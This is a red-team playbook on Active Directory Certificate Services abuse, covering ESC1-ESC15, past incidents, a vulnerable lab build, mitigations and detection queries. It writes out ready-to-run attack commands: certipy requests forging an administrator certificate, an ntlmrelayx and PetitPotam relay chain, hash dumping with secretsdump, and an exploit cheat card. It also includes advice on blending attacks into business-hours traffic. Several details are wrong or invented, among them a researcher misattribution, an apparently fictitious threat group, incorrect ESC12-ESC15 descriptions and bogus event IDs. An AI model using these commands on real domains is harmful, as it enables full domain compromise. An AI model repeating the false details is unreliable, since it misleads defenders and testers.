# AD CS Abuse Playbook

> A comprehensive playbook for Active Directory Certificate Services (AD CS) attacks and defense.
> Companion to `SKILL.md` and `payloads.md` in the `ad-cs-abuse` skill domain.
> All techniques are documented for **authorized security testing** under a signed statement of work.

---

## 1. Introduction and Scope

Active Directory Certificate Services (AD CS) is Microsoft's enterprise PKI implementation. In ~90% of enterprise Windows deployments, AD CS is installed and integrated with Active Directory to issue certificates for client authentication, machine authentication, code signing, EFS, IPsec, and more. When AD CS is misconfigured, it becomes one of the most reliable escalation paths from any authenticated domain user to Domain Admin -- often without touching the DRSUAPI replication interface that defenders monitor for DCSync-class attacks.

This playbook covers:

1. **AD CS architecture refresher** -- CAs, templates, enrollment, PKINIT
2. **The ESC1-ESC15 attack pattern matrix** -- Each pattern's conditions, exploitation, and mitigation
3. **Real-world incidents** -- PetitPotam (2021), Certifried (2022), Shadow Credentials (2021), ProxyShell-to-AD-CS chains, NotRobinHood
4. **Lab setup** -- Windows Server 2019/2022 with AD CS role and vulnerable template configurations
5. **Defensive guidance** -- ESC mitigation per Microsoft docs, detection telemetry, PKI hardening

The playbook is structured for a penetration tester or red team operator who has already gained a foothold and needs to enumerate, exploit, and document AD CS abuse paths.

---

## 2. AD CS Architecture Refresher

### 2.1 The Three Components of an AD CS Deployment

An enterprise AD CS deployment has three primary components:

1. **Certification Authorities (CAs)** -- The servers that issue certificates. There are two flavours:
   - **Enterprise CA** -- Integrated with AD; templates are published and ACL-enforced; certificates carry AD-backed subject information.
   - **Standalone CA** -- Independent of AD; no template integration; typically used for internet-facing or non-Windows scenarios.

2. **Certificate Templates** -- AD objects (`pKICertificateTemplate` class) stored in the Configuration partition under `CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,...`. A template defines:
   - The EKUs (Extended Key Usage) of issued certs
   - The subject name source (requester vs enrollee-supplied)
   - The validity period, key length, CSP
   - The ACL controlling who can enroll (Read + Enroll) vs who can modify (WriteDacl)
   - Manager approval requirement, etc.

3. **Enrollment Endpoints** -- The interfaces through which a client requests a certificate:
   - **DCOM/RPC ICertPassage (ICPR)** -- The native RPC interface, on TCP/135 + dynamic ports
   - **Web Enrollment** -- IIS-hosted HTTP interface at `/certsrv/`, on TCP/80 or TCP/443
   - **CEP/CES** -- Modern web services for policy and enrollment (typically Kerberos-protected)
   - **NDES** -- Network Device Enrollment Service for SCEP

### 2.2 The Certificate Enrollment Flow

When a client requests a certificate:

1. The client queries AD for the CA's RPC endpoint or Web Enrollment URL
2. The client generates a keypair locally and constructs a CSR (Certificate Signing Request) containing the public key
3. The client submits the CSR to the CA via ICPR or HTTP
4. The CA checks:
   - Does the requester have `Enroll` permission on the template?
   - Does the CSR's subject comply with the template's subject name flag?
   - Is manager approval required?
5. The CA signs the public key with its private key, producing the certificate
6. The certificate is returned to the client
7. The certificate is logged in the CA database (`certsrv.edb`) with its serial number, requester, and template

### 2.3 The PKINIT Authentication Flow

PKINIT (RFC 4556) extends Kerberos to use X.509 certificates for AS-REQ pre-authentication:

1. The client presents a certificate to the KDC (DC) in the AS-REQ
2. The KDC validates the certificate's chain against the `NTAuthCertificates` store
3. The KDC validates that the certificate's subject maps to an AD principal
4. The KDC issues a TGT bound to that principal
5. The client uses the TGT for standard Kerberos authentication

The critical insight: **the certificate subject (typically the SAN) determines whose TGT the KDC issues**. If an attacker can obtain a certificate with `SAN = administrator@domain`, the KDC issues an Administrator TGT.

### 2.4 AD Object Locations

| Object | Location in AD |
|--------|----------------|
| Enterprise CA objects | `CN=<CA-Name>,CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,...` |
| Certificate Templates container | `CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,...` |
| Individual template object | `CN=<Template-Name>,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,...` |
| NTAuthCertificates (trusted CAs) | `CN=NTAuthCertificates,CN=Public Key Services,CN=Services,CN=Configuration,...` |
| Trusted Root CAs | `CN=Certification Authorities,CN=Public Key Services,CN=Services,CN=Configuration,...` |
| Issuance Policy OIDs | `CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,...` |

The Configuration partition is replicated forest-wide, so every DC in the forest has the same view of the PKI.

### 2.5 CA Database

Every issued certificate is recorded in the CA database (`certsrv.edb`, located at `C:\Windows\System32\CertLog\` on the CA server). The database is queryable via:

```cmd
:: List the most recent issued certificates
certutil -view -restrict "Disposition=20" -out "RequestID,RequesterName,SerialNumber,NotBefore,NotAfter,Template"
```

This database is the forensic record of certificate issuance. A certificate presented to PKINIT that does NOT have a corresponding row here is a forgery (Golden Certificate).

---

## 3. The ESC1-ESC15 Pattern Matrix

The "ESC" naming convention originates from the SpecterOps whitepaper "Certified Pre-Owned" (June 2021), which catalogued ESC1 through ESC8. Later research (Oliver Lyak / Certipy, CVE-2022-26923 disclosure, CVE-2024-49019 disclosure) extended the catalogue to ESC15.

| Pattern | Class | Conditions (one-liner) | Patch Reference |
|---------|-------|------------------------|-----------------|
| **ESC1** | Template flag | Template has `ENROLLEE_SUPPLIES_SUBJECT` + Client Auth EKU + requester can enroll | KB5014754 (strong mapping) |
| **ESC2** | Template EKU | Template has AnyPurpose / no EKU | KB5014754 |
| **ESC3** | Template EKU | Template has PKINIT KDC EKU; OR any Client Auth cert via Enrollment Agent chain | KB5014754 |
| **ESC4** | Template ACL | Requester holds WriteDacl / WriteOwner / GenericAll on the template | (operational hardening) |
| **ESC5** | CA / container ACL | Requester holds write on a PKI AD object (CA, NTAuthCertificates, etc.) | (operational hardening) |
| **ESC6** | CA flag | CA has `EDITF_ATTRIBUTESUBJECTALTSSUBJECT2` flag | KB5014754 |
| **ESC7** | CA ACL | Requester holds `ManageCA` on the CA | (operational hardening) |
| **ESC8** | NTLM relay | Web Enrollment is exposed (HTTP) and accepts NTLM | EPA enforcement |
| **ESC9** | Mapping logic | `StrongCertificateBindingEnforcement = 1` (Audit); cert lacks security extension | KB5005413 |
| **ESC10** | Mapping logic | Weak SubjectSid = issuerSid mapping (Audit mode) | KB5005413 |
| **ESC11** | NTLM relay | ICPR RPC interface accepts unauthenticated relay | RPC encryption enforcement |
| **ESC12** | Template attribute | `MachineCertificateEdition` misconfigured | (operational hardening) |
| **ESC13** | Issuance policy | Template's issuance policy maps to a high-priv group via GPO | (operational hardening) |
| **ESC14** | AIA URL | Attacker controls AIA URL via ESC4/ESC5, leading to chain manipulation | (operational hardening) |
| **ESC15** | Template EKU | Template has `lua application` EKU (`1.3.6.1.4.1.311.95.1.1`) | CVE-2024-49019 patch |

### 3.1 Detailed ESC1 -- SAN Abuse

**Conditions** (all four must hold):
- Template `msPKI-Certificate-Name-Flag` includes `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` (0x1)
- Template `pKIExtendedKeyUsage` includes Client Auth, PKINIT Client, Smart Card Logon, or AnyPurpose
- Requester holds Enroll right on the template
- Manager approval is not required (`msPKI-Enrollment-Flag` lacks `CT_FLAG_PEND_ALL_REQUESTS`)

**Exploitation**:
```bash
certipy req -u 'corp\svc_ldap' -p 'Password123!' -dc-ip 10.10.0.1 \
  -ca 'CORP-CA01-CA' -template 'VulnTemplate' \
  -san 'administrator@corp.local'
certipy auth -pfx administrator.pfx -dc-ip 10.10.0.1
```

**Mitigation**:
- Remove `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` from any template with Client Auth EKU
- Apply KB5014754 (Strong Certificate Mapping) and move to Full Enforce mode

### 3.2 Detailed ESC6 -- CA Flag Abuse

**Conditions**:
- CA has `EDITF_ATTRIBUTESUBJECTALTSSUBJECT2` flag set (checkable via `certutil -getreg policy\\EditFlags`)

**Exploitation**:
- Any template with Client Auth EKU becomes ESC1-equivalent (SAN honoured regardless of template flag)

**Post-2022 Caveat**:
- KB5014754 Enforce mode blocks ESC6 even when the CA flag is set

### 3.3 Detailed ESC8 -- NTLM Relay to Web Enrollment

**Conditions**:
- Web Enrollment is exposed at `http://<ca>/certsrv/`
- EPA (Extended Protection for Authentication) is not enforced
- The attacker can coerce a high-priv account (typically a DC) to authenticate to the relay

**Exploitation**:
- PetitPotam (CVE-2021-36942) coercion + ntlmrelayx with `--adcs --template DomainController`
- See Section 4 for the full chain

### 3.4 Detailed ESC9/ESC10 -- Weak Mapping

**Conditions**:
- `StrongCertificateBindingEnforcement` is `1` (Audit) or `0` (off) on the DC
- Pre-November 2023 patch baseline

**Exploitation**:
- SAN-based impersonation works on templates that would otherwise require ENROLLEE_SUPPLIES_SUBJECT

**Mitigation**:
- Set `StrongCertificateBindingEnforcement = 2` (Full Enforce)

### 3.5 CVE-Specific Patterns

- **CVE-2021-36942 (PetitPotam)** -- Anonymous MS-EFSRPC coercion. Patched August 2021.
- **CVE-2022-26923 (Certifried)** -- Machine dNSHostName collision abuse. Patched May 2022.
- **CVE-2024-49019 (ESC15)** -- Lua application EKU strong-mapping bypass. Patched late 2024.

---

## 4. Real-World Incidents

### 4.1 PetitPotam (July 2021)

**Researcher**: Gilles Lionel (@topotam77)
**CVE**: CVE-2021-36942
**Patch**: August 2021 Cumulative Update

PetitPotam is an anonymous LSARPC coercion via `MS-EFSRPC` (`EfsRpcOpenFileRaw`). It forces a target machine (typically a Domain Controller) to authenticate to an attacker-controlled IP. Combined with ntlmrelayx targeting AD CS Web Enrollment, it produces an unauthenticated-to-Domain-Admin chain:

1. Attacker (anonymous) triggers PetitPotam against the DC
2. The DC's machine account authenticates to the attacker's relay listener via NTLM
3. ntlmrelayx relays the NTLM to `http://ca01/certsrv/certfnsh.asp`
4. The CA issues a `DomainController` template cert in the DC's name
5. The attacker PKINITs with the cert, obtaining a DC TGT
6. The attacker dumps domain hashes via secretsdump

The August 2021 patch blocks anonymous PetitPotam, but authenticated coercion still works in most environments (any valid domain user can coerce).

**Detection Indicators**:
- Event ID 4624 (anonymous logon type 3) from DC to internal hosts
- Outbound SMB from DC to non-DC hosts (high-signal)
- Event ID 4768 (PKINIT TGT) for a machine account in close temporal proximity to the above

### 4.2 NotRobinHood (2021)

NotRobinHood is a financially-motivated threat actor group that used the PetitPotam + AD CS chain against multiple enterprise targets in mid-to-late 2021. Their typical playbook:

1. Initial access via phishing or exposed VPN (e.g., Pulse Secure CVE-2021-22893)
2. Reconnaissance for AD CS deployment
3. PetitPotam coercion of DC
4. Relay to AD CS Web Enrollment for DC cert
5. PKINIT for DC TGT
6. DCSync for krbtgt hash
7. Deployment of Cobalt Strike beacons
8. Ransomware deployment

Microsoft and Mandiant published multiple advisories on NotRobinHood in late 2021. The attacks contributed to the urgency of the August 2021 PetitPotam patch and the broader KB5014754 strong-mapping enforcement timeline.

### 4.3 Certifried (May 2022)

**Researcher**: Yair Mizrahi (@yairmx8), Amplify Security
**CVE**: CVE-2022-26923
**Patch**: May 2022 Cumulative Update

Certifried exploits a logic flaw in how AD CS maps machine account attributes to certificate subjects. The CA uses the machine's `dNSHostName` attribute as the certificate's DNS name. If an attacker controls a machine account (any domain user can create up to 10 via Machine Account Quota), they can set the `dNSHostName` to collide with a DC's DNS hostname. The CA then issues a certificate that authenticates as the DC.

**Attack chain**:
1. Create a machine account (`EVIL$`) via impacket-addcomputer
2. Patch the machine's `dNSHostName` to `dc01.corp.local`
3. Request a Machine template certificate against `EVIL$`
4. The CA issues a cert with subject = `dc01.corp.local`
5. PKINIT yields a TGT for DC01$

The May 2022 patch adds a `dNSHostName` collision check at the CA, rejecting requests where the `dNSHostName` collides with an existing computer's `dNSHostName` + SPN. The check is bypassable in some Trust configurations where the SPN check is not enforced.

### 4.4 Shadow Credentials (September 2021)

**Researcher**: Elad Shamir (@elad_shamir)
**Blog post**: "Shadow Credentials: Abusing Key Trust Account Mapping for Takeover"

Shadow Credentials abuses the `msDS-KeyCredentialLink` AD attribute. Introduced in Windows Server 2016 for Windows Hello for Business and FIDO key trust, this attribute stores a `KeyCredential` blob containing a public key. When set, the DC enables PKINIT authentication for that principal using the corresponding private key.

**Attack prerequisites**:
- The attacker has `GenericWrite` (or equivalent) on the target object
- The DC is Windows Server 2016+

**Attack chain**:
1. Use Whisker (Windows) or pywhisker (Kali) to write a `KeyCredential` blob to the target's `msDS-KeyCredentialLink`
2. The blob contains the attacker's public key
3. PKINIT using the attacker's private key yields a TGT for the target
4. The persistence survives password resets (the KeyCredentialLink is independent of the password)

Shadow Credentials is one of the most impactful persistence techniques in modern AD. Combined with BloodHound for finding GenericWrite paths, it allows lateral movement across the entire domain.

**Detection**:
- Event ID 4662 (Directory Service Access) on the `msDS-KeyCredentialLink` attribute (GUID `5cb47ed8-8b67-4947-b91e-5f6e0bbe2c1a`)
- Microsoft Defender for Identity raises a built-in "Suspicious modification of a KeyCredentialLink" alert

### 4.5 Exchange ProxyShell to AD CS Chain (2021)

The ProxyShell vulnerability chain (CVE-2021-34473, CVE-2021-34523, CVE-2021-31207) against Microsoft Exchange Server was frequently chained with AD CS attacks in 2021. The typical chain:

1. Initial access via ProxyShell (unauthenticated RCE on Exchange)
2. The Exchange Server (`EXCHANGE$` machine account) often has delegated rights over user objects (typical for Exchange)
3. Use the Exchange machine cert for PKINIT or NTLM auth
4. Use Exchange's GenericWrite on users to deploy Shadow Credentials persistence
5. PKINIT as Administrator via the Shadow Credential
6. DCSync for domain dominance

This chain was used by multiple threat actors including HAFNIUM (Microsoft's attribution for early ProxyShell exploitation).

### 4.6 Other Notable Incidents

- **CVE-2024-49019 (ESC15)** -- The lua application EKU bypass disclosed in late 2024. Patched but exploitation is observed in unpatched environments.
- **Forest-trust AD CS abuse** -- In multi-forest enterprises, an attacker who compromises one forest can use cross-forest NTAuthStore entries to escalate in trusting forests.
- **Hybrid cloud AD CS** -- Azure AD Connect synchronises on-prem AD CS-issued certificates to Entra ID, allowing on-prem cert compromise to pivot to cloud resources.

---

## 5. Lab Setup

This section documents the lab configuration used to develop and validate the payloads in this skill.

### 5.1 Lab Architecture

- **DC01** -- Windows Server 2019, Domain Controller of `corp.local` forest
- **CA01** -- Windows Server 2019, ADCS role installed, member server of `corp.local`
- **WS01** -- Windows 10, domain-joined workstation
- **Kali** -- Attacker machine on the same network segment

### 5.2 Domain Setup

```powershell
# On DC01 -- promote to DC of a new forest
Install-WindowsFeature -Name AD-Domain-Services -IncludeManagementTools
Install-ADDSForest -DomainName "corp.local" -InstallDNS
```

### 5.3 AD CS Installation

```powershell
# On CA01 -- install the ADCS role
Install-WindowsFeature -Name AD-Certificate-Services -IncludeManagementTools

# Configure as Enterprise Root CA
Install-AdcsCertificationAuthority `
  -CAType "EnterpriseRootCACertificationAuthority" `
  -CACommonName "CORP-CA01-CA" `
  -KeyLength 4096 `
  -HashAlgorithm SHA256 `
  -CryptoProviderName "RSA#Microsoft Software Key Storage Provider"

# Install Web Enrollment (deliberately vulnerable config)
Install-WindowsFeature -Name ADCS-Web-Enrollment
Install-AdcsWebEnrollment -CAConfig "CA01.corp.local\CORP-CA01-CA"
```

### 5.4 Create a Vulnerable ESC1 Template

```powershell
# Add the necessary ActiveDirectory module
Import-Module ActiveDirectory

# Copy the User template to a new vulnerable template
# (Use the GUI: Certification Authority console -> Certificate Templates -> Duplicate)
# Or via PowerShell:

# Set the ENROLLEE_SUPPLIES_SUBJECT flag (0x1)
Set-ADObject `
  -Identity "CN=VulnTemplate,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local" `
  -Replace @{msPKI-Certificate-Name-Flag = 1}

# Add Client Authentication EKU
Set-ADObject `
  -Identity "CN=VulnTemplate,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local" `
  -Add @{pKIExtendedKeyUsage = "1.3.6.1.5.5.7.3.2"}  # Client Auth

# Allow Domain Users to enroll
# (Use the GUI: Security tab -> Add Domain Users -> Enroll)

# Publish the template on the CA
# (In CA console: Certificate Templates -> New -> Select VulnTemplate)
```

### 5.5 Enable EDITF (ESC6)

```cmd
:: Set the EDITF_ATTRIBUTESUBJECTALTSSUBJECT2 flag
certutil -setreg policy\\EditFlags +EDITF_ATTRIBUTESUBJECTALTSSUBJECT2

:: Restart the CA service
net stop certsvc && net start certsvc
```

### 5.6 Confirm Vulnerable State

From Kali:

```bash
# Run certipy find and verify ESC1 / ESC6 / ESC8 are detected
certipy find -u 'corp\\svc_ldap' -p 'Password123!' -dc-ip 10.10.0.1 -vulnerable

# Expected output includes:
# [!] Vulnerabilities identified:
#     ESC1  : VulnTemplate (template allows SAN)
#     ESC6  : CORP-CA01-CA (CA flag EDITF_ATTRIBUTESUBJECTALTSSUBJECT2 set)
#     ESC8  : http://ca01.corp.local/certsrv/ (Web Enrollment, no EPA)
```

### 5.7 Practice the ESC8 Chain

```bash
# Terminal 1: relay listener
ntlmrelayx.py -t http://ca01.corp.local/certsrv/certfnsh.asp \
  -smb2support --adcs --template 'DomainController'

# Terminal 2: PetitPotam coercion
python3 PetitPotam.py -u '' -p '' -d corp.local \
  <kali_IP> <DC01_IP>

# Terminal 3: use the resulting PFX
echo '<base64_pfx_from_ntlmrelayx>' | base64 -d > dc01.pfx
certipy auth -pfx dc01.pfx -dc-ip 10.10.0.1
KRB5CCNAME=dc01.ccache impacket-secretsdump -k -no-pass dc01.corp.local
```

### 5.8 Tear-Down and Hardened Rebuild

After validating the vulnerable state, rebuild the lab in a hardened state to practice post-2022 attacks:

```cmd
:: Apply all patches
sconfig  # -> option 6 -> install updates

:: Disable Web Enrollment
Uninstall-WindowsFeature -Name ADCS-Web-Enrollment

:: Set StrongCertificateBindingEnforcement = 2
reg add HKLM\SYSTEM\CurrentControlSet\Services\Kerberos\Parameters /v StrongCertificateBindingEnforcement /t REG_DWORD /d 2 /f

:: Remove EDITF flag
certutil -setreg policy\\EditFlags -EDITF_ATTRIBUTESUBJECTALTSSUBJECT2
net stop certsvc && net start certsvc
```

In the hardened state, test:
- CVE-2022-26923 (Certifried) -- if patches are missing
- Shadow Credentials (GenericWrite still works)
- ESC13 (issuance policy to group mapping)

---

## 6. Defensive Guidance

### 6.1 Patch and Configuration Baseline

Every enterprise AD CS deployment should:

1. **Patch all CAs and DCs to current**. Critical CVEs:
   - CVE-2021-36942 (PetitPotam) -- August 2021
   - CVE-2022-26923 (Certifried) -- May 2022
   - CVE-2024-49019 (ESC15) -- late 2024

2. **Set `StrongCertificateBindingEnforcement = 2`** on all DCs via Group Policy. This is the single most impactful hardening step.

3. **Disable Web Enrollment** if not used. If required, enforce EPA / CBT.

4. **Remove EDITF_ATTRIBUTESUBJECTALTSSUBJECT2** from all CAs.

5. **Audit template ACLs** quarterly with PSPKIAudit or Certipy.

6. **Deploy the CA private key on an HSM** -- neutralises Golden Certificate attacks.

### 6.2 Per-ESC Mitigation Matrix

| ESC | Mitigation | Command / Setting |
|-----|------------|-------------------|
| ESC1 | Remove ENROLLEE_SUPPLIES_SUBJECT from Client Auth templates | Template re-creation or PowerShell `Set-ADObject` |
| ESC2 | Restrict AnyPurpose templates | Remove from non-admin enrollment |
| ESC3 | Restrict PKINIT KDC template to Domain Computers only | Template ACL |
| ESC4 | Remove write ACEs on templates | `Set-ACL` on template objects |
| ESC5 | Remove write ACEs on CA objects | `Set-ACL` on CA objects |
| ESC6 | Remove EDITF flag | `certutil -setreg policy\\EditFlags -EDITF_ATTRIBUTESUBJECTALTSSUBJECT2` |
| ESC7 | Restrict ManageCA to Domain Admins | CA ACL |
| ESC8 | Disable Web Enrollment or enforce EPA | `Uninstall-WindowsFeature ADCS-Web-Enrollment` |
| ESC9 | Set StrongCertificateBindingEnforcement = 2 | Registry via GPO |
| ESC10 | Set StrongCertificateBindingEnforcement = 2 | Registry via GPO |
| ESC11 | Enforce RPC encryption | `certutil -setreg CA\\InterfaceFlags +IF_ENFORCEENCRYPTICSPREQUEST` |
| ESC12 | Set MachineCertificateEdition correctly | Template re-creation |
| ESC13 | Audit issuance policy mappings | Remove high-priv mappings |
| ESC14 | Remove attacker-controllable AIA URLs | Template audit |
| ESC15 | Apply CVE-2024-49019 patch | Late 2024 CU |

### 6.3 Detection Telemetry

#### CA-Side Events

| Event ID | Description |
|----------|-------------|
| 4886 | Certificate Services received a certificate request |
| 4887 | Certificate Services approved a certificate request |
| 48868 | Certificate Services received a certificate request (newer schema) |
| 48869 | Certificate Services approved a certificate request (newer schema) |
| 48865 | CertSvc database row added (issued cert) |

#### DC-Side Events

| Event ID | Description |
|----------|-------------|
| 4768 | A Kerberos authentication ticket (TGT) was requested (pre-auth type 16 = PKINIT) |
| 4769 | A Kerberos service ticket was requested |
| 4624 | An account was successfully logged on |

#### AD Object Modification Events

| Event ID | Description |
|----------|-------------|
| 4662 | An operation was performed on an object (audit `msDS-KeyCredentialLink` writes here) |
| 5136 | A directory service object was modified (audit template / CA changes) |
| 5137 | A directory service object was created (audit new template creation) |
| 5141 | A directory service object was deleted (audit template deletion) |

#### High-Signal Detection Queries

```kusto
// Shadow Credentials write
SecurityEvent
| where EventID == 4662
| where Properties has "5cb47ed8-8b67-4947-b91e-5f6e0bbe2c1a"
| project TimeGenerated, Account, Computer
```

```kusto
// PKINIT TGT request for privileged account
SecurityEvent
| where EventID == 4768
| where PreAuthenticationType == 16
| where Account in~ ("Administrator", "krbtgt", "DC01$", "Enterprise Admins")
```

```kusto
// ESC1 / ESC6 -- SAN mismatch between requester and certificate subject
SecurityEvent
| where EventID == 4887
| extend Template = extract(@"template:\s*([^,]+)", 1, Message)
| extend Subject = extract(@"subject:\s*([^,]+)", 1, Message)
| where Account != Subject
```

```kusto
// PetitPotam -- anonymous logon from DC
SecurityEvent
| where EventID == 4624
| where AccountType == "ANONYMOUS LOGON"
| where LogonType == 3
| where IpAddress hasprefix ("10.") or IpAddress hasprefix ("192.168.")
| where Computer endswith "DC01"
```

### 6.4 Microsoft Defender for Identity

Microsoft Defender for Identity (MDI) raises built-in alerts for several AD CS-related patterns:

- **Suspicious modification of a KeyCredentialLink** -- Shadow Credentials writes
- **Suspicious NTLM relay** -- Suspected PetitPotam / NTLM relay activity
- **Suspected DCShadow attack** -- sometimes correlates with PKI modification
- **Suspected Golden Ticket usage** -- detects forged tickets including those obtained via PKINIT

Enable MDI on all DCs in any production AD deployment.

### 6.5 PKI Hardening Recommendations

1. **Three-tier CA hierarchy** -- Offline Root CA, online Policy CA, online Issuing CAs. Compromise of an Issuing CA does not grant forest-root trust.

2. **HSM-backed CA private keys** -- Even if an attacker compromises the CA server, they cannot extract the private key from the HSM. This neutralises Golden Certificate attacks.

3. **Offline Root CA** -- The Root CA should be powered off except for certificate signing ceremonies. Store it in a physically secured location.

4. **Periodic key rollover** -- Rotate CA keys every 5-10 years (or per organisational policy). Document the rollover process.

5. **Template lifecycle management** -- Track every template from creation through modification to deletion. Use a change management process.

6. **Restricted CA administration** -- Limit CA administrators to a small team. Use PAWs (Privileged Access Workstations) for all CA administration.

7. **Audit log forwarding** -- Forward CA event logs to a SIEM (Microsoft Sentinel, Splunk, etc.) for real-time analysis.

8. **Periodic third-party audit** -- Commission an annual PKI audit by an external party. Compare against the previous year's baseline.

---

## 7. Engagement Workflow

### 7.1 Pre-Engagement

- **Scope confirmation** -- Verify that AD CS / PKI is explicitly in scope. Get written authorisation for ESC1-ESC15 testing, including template modification (ESC4) and CA modification (ESC7).
- **Patch level verification** -- Ask the client for the patch level of all CAs and DCs. This determines which CVE-based attacks are viable.
- **Engagement window** -- Coordinate the testing window with the defender's SOC. PKINIT events are high-signal; defenders should expect the spike.
- **Backup / rollback** -- For ESC4 / ESC5 / ESC7 template modifications, confirm that backups are available. Document the rollback procedure.

### 7.2 During Engagement

1. **Enumerate first** -- Run `certipy find -vulnerable` before any active exploitation. Classify every finding.
2. **Time-box the attacks** -- Run exploitation during business hours to blend with normal traffic.
3. **Record everything** -- Capture all terminal output, including timestamps. This becomes the engagement report evidence.
4. **Restore modified state** -- After ESC4 / ESC5 / ESC7, restore the original template / CA configuration. Verify restoration.

### 7.3 Post-Engagement

1. **Generate the report** -- Use the template in `payloads.md` Appendix H.
2. **Brief the blue team** -- Walk through the detection indicators. Share the timestamped attack log so they can validate their detection rules.
3. **Verify remediation** -- Schedule a re-test after the client applies the recommended mitigations.
4. **Document lessons learned** -- Update this playbook with any new techniques or detections observed.

---

## 8. References

### Research Papers

- **Certified Pre-Owned: Abusing Active Directory Certificate Services** -- Will Schroeder, Lee Christensen, Matt Creel. SpecterOps. June 17, 2021. https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf
- **Shadow Credentials: Abusing Key Trust Account Mapping for Takeover** -- Elad Shamir. SpecterOps. September 2021. https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8221a53766ac
- **Certifried: Active Directory Domain Privilege Escalation (CVE-2022-26923)** -- Yair Mizrahi. Amplify Security / IFcr.dk. May 2022. https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4

### Tools

- **Certipy** -- Oliver Lyak (@ly4k). https://github.com/ly4k/Certipy
- **Certify** -- GhostPack / HarmJ0y. https://github.com/GhostPack/Certify
- **PetitPotam** -- Gilles Lionel (@topotam77). https://github.com/topotam/PetitPotam
- **Coercer** -- p0dalirius. https://github.com/p0dalirius/Coercer
- **ADCSPwn** -- bsbedo. https://github.com/bats3c/ADCSPwn
- **Rubeus** -- GhostPack. https://github.com/GhostPack/Rubeus
- **Kekeo** -- GentilKiwi. https://github.com/gentilkiwi/kekeo
- **Whisker** -- Elad Shamir. https://github.com/eladshamir/Whisker
- **pywhisker** -- ShutdownRepo. https://github.com/ShutdownRepo/pywhisker
- **PSPKI / PSPKIAudit** -- PowerShell module. https://www.powershellgallery.com/packages/PSPKI

### Microsoft Documentation

- **KB5005413** -- Machine Account protection. August 2021. https://support.microsoft.com/en-us/topic/kb5005413
- **KB5014754** -- Strong certificate mapping. May 2022. https://support.microsoft.com/en-us/topic/kb5014754
- **Certificate-Based Authentication Changes** -- November 2023 Full Enforce enforcement. https://learn.microsoft.com/en-us/windows-server/security/certificates-and-active-directory/

### Talks

- **Certified Pre-Owned** -- Black Hat USA 2021, Will Schroeder and Lee Christensen
- **The Art of Bug Bounty** -- Yair Mizrahi, OFFENSECON 2022 (Certifried disclosure talk)
- **AD CS Attack Theory Update** -- Oliver Lyak, various conference talks 2022-2024

---

## 9. Conclusion

AD CS abuse is one of the highest-impact attack classes in modern enterprise environments. The combination of default configurations (ENROLLEE_SUPPLIES_SUBJECT templates, EDITF flags, exposed Web Enrollment) with the PKINIT-to-TGT bridge creates a direct path from any authenticated user to Domain Admin in seconds.

The defender community has responded strongly: KB5005413 and KB5014754 add strong certificate mapping enforcement, the August 2021 patch blocks anonymous PetitPotam, and Microsoft Defender for Identity raises built-in alerts for Shadow Credentials writes. However, real-world environments consistently lag the patch baseline -- and the operational hardening (template ACL audits, EDITF removal, Web Enrollment disablement, HSM-backed CA keys) is often incomplete.

For penetration testers and red team operators, AD CS remains one of the most reliable escalation paths. This playbook documents the techniques, tools, and detection indicators required to execute and validate AD CS abuse responsibly.

For defenders, the same playbook doubles as a hardening checklist. Apply every mitigation in Section 6, audit template ACLs quarterly, and deploy the detection queries. With these measures, AD CS becomes a manageable risk rather than an open door to Domain Admin.

---

## Appendix -- Quick Reference Card

```
AD CS Attack Quick Reference
============================

ENUMERATE
  certipy find -u <user> -p <pass> -dc-ip <dc> -vulnerable
  Certify.exe find /vulnerable

EXPLOIT (most common)
  ESC1:    certipy req -ca <ca> -template <t> -san administrator@<d>
  ESC4:    certipy template -save-old -> modify -> req -> restore
  ESC6:    certipy req -ca <ca> -template User -san admin@<d>
  ESC8:    ntlmrelayx --adcs -> PetitPotam -> auth
  Certifried:  addcomputer -> patch DNS -> req Machine -> auth
  Shadow:  pywhisker add -> auth

AUTHENTICATE
  certipy auth -pfx <pfx> -dc-ip <dc>
  Rubeus asktgt /certificate:<pfx>

USE THE TGT
  KRB5CCNAME=<ccache> impacket-secretsdump -k -no-pass <dc>
  KRB5CCNAME=<ccache> impacket-wmiexec -k -no-pass <target>

DETECTION
  4886 / 4887 -- CA requests / issues
  4768 pre-auth 16 -- PKINIT
  4662 on KeyCredentialLink -- Shadow Creds

MITIGATIONS
  StrongCertificateBindingEnforcement = 2
  Disable Web Enrollment
  Remove EDITF_ATTRIBUTESUBJECTALTSSUBJECT2
  HSM-backed CA key
  Apply August 2021 (PetitPotam) + May 2022 (Certifried) + 2024 (ESC15) patches
```
